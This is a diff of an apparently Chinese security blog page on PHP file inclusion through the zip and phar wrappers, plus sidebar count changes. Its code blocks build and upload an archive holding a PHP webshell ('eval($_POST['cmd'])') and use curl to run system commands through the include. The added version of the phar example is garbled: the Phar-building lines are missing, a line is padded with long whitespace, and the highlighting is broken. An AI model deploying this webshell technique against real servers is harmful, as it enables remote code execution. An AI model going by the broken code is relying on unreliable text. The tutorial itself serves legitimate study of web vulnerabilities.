@@ -436,7 +436,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;?php echo system('ls -al');?&gt;"</span> &gt; ls.php</span><br><span class="line">$ zip -r shell.zip ls.php</span><br><span class="line">  adding: ls.php (stored 0%)</span><br><span class="line"><span class="comment"># 上传后</span></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=phar://./shell.zip/ls.php"</span></span><br><span class="line">total 128</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>phar://，读取一个phar/zip文件，可以利用成RCE:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat phar.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">'shell.phar'</span>, 0);</span><br><span class="line"><span class="variable">$phar</span>[<span class="string">'shell.php'</span>] = <span class="string">'&lt;?php echo 12321; eval($_POST[\'</span>cmd\<span class="string">']);?&gt;'</span> ;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">?&gt;</span><br><span class="line">$ php phar.php</span><br><span class="line"><span class="comment"># 上传phar后</span></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=phar://./shell.phar/shell.php"</span> --data <span class="string">"cmd=system('ls -al');"</span></span><br><span class="line">12321total 128</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ cat phar.php</span><br><span class="line">&lt;?php</span><br><span class="line">                                                                                                   ?&gt;<span class="string">' ;</span></span><br><span class="line"><span class="string">$phar-&gt;setStub('</span>&lt;?php __HALT_COMPILER();?&gt;<span class="string">');</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">$ php phar.php</span></span><br><span class="line"><span class="string"># 上传phar后</span></span><br><span class="line"><span class="string">$ curl "http://localhost/include.php?file=phar://./shell.phar/shell.php" --data "cmd=system('</span>ls -al<span class="string">');"</span></span><br><span class="line"><span class="string">12321total 128</span></span><br><span class="line"><span class="string">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span></span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
@@ -567,7 +567,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -580,7 +580,7 @@
             <a href="/categories/">
           
         
-        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-count">28</span>
         <span class="site-state-item-name">分类</span>
         </a>
       </div>
@@ -593,7 +593,7 @@
             <a href="/tags/">
           
         
-        <span class="site-state-item-count">67</span>
+        <span class="site-state-item-count">68</span>
         <span class="site-state-item-name">标签</span>
         </a>
       </div>
